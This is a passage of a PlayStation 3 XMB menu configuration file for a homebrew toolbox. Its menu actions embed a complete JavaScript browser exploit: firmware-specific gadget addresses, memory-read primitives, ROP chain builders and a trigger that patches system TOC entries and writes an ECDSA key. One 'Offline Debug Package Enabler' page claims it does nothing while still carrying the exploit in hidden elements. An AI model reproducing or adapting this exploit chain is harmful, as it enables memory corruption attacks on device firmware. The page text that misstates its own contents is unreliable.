} else if (fwv=="4.82") { var default_vsh_pub_toc=7329428, vsh_opd_addr=7322712, vsh_ps3xploit_key_toc=7438556, toc_entry2_addr=7561100, toc_entry5_addr=7321520, gadget2_addr=6364256, gadget6_addr=6412376, gadget_mod1_addr=6384468 } else if (fwv=="4.84") { var default_vsh_pub_toc=7329436, vsh_opd_addr=7322720, vsh_ps3xploit_key_toc=7438804, toc_entry2_addr=7562440, toc_entry5_addr=7321528, gadget2_addr=6364416, gadget6_addr=6412536, gadget_mod1_addr=6384628, ipf1_addr=7322728 } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+ps3xploit_ecdsa_key.convert(true)+index_key.convert(true)+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}ps3xploit_ecdsa_key_addr=xtra_data_addr+start_x.convertedSize()-0x4;index_key_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);stack_frame=stack_frame_hookup()+store_word(toc_entry1_addr,vsh_opd_patch+4)+store_word(toc_entry3_addr,vsh_opd_patch+4)+store_word(toc_entry5_addr,vsh_opd_patch+4)+store_word(ipf1_addr,ipf2_addr)+store_word(default_vsh_pub_toc,vsh_ps3xploit_key_toc)+memcpy(vsh_ps3xploit_key_toc-0x20,index_key_addr,(index_key.length/2))+memcpy(vsh_ps3xploit_key_toc,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_debug_auto_dex_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/net_pkg.png</String></Pair>
				<Pair key="title"><String>Offline Debug Package Enabler</String></Pair>
				<Pair key="info"><String>Enable modified retail packages</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\074hr\076",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));document.write(\047\074html\076\074head\076\074title\076This is always enabled on CFW\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Debug Packages is always enabled on CFW. No need to do anything (this page doesn\\047t actually do anything).\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047);');</String></Pair>
			</Table>
		</Attributes>
		<Items>
			<Query 
				class="type:x-xmb/module-action"
				key="han_reboot_hard_auto_dex_offline"
				attr="han_reboot_hard_auto_dex_offline"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_reboot_soft_auto_dex_offline"
				attr="han_reboot_soft_auto_dex_offline"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_enabler_auto_dex_offline"
				attr="han_enabler_auto_dex_offline"
				/>
			<Query 
				class="type:x-xmb/module-action"
				key="han_debug_auto_dex_offline"
				attr="han_debug_auto_dex_offline"
				/>
		</Items>
	</View>

</XMBML>
